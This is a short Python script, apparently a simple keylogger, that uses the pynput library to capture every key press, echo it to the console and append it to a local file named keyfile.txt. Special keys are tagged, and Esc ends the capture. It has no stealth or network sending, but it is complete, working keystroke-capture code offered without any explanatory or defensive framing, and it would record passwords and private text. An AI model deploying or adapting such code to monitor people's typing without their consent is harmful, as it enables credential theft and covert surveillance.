from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keyfile.txt",'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
             if key == keyboard.Key.space:
                logKey.write(' [SPACE] ')
             elif key == keyboard.Key.enter:
                logKey.write(' [ENTER]\n')
             elif key == keyboard.Key.backspace:
                logKey.write(' [BACKSPACE] ')
             elif key == keyboard.Key.tab:
                logKey.write(' [TAB] ')
             elif key == keyboard.Key.esc:
                return False
             else:
                logKey.write(f' [{key}] ')
     

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()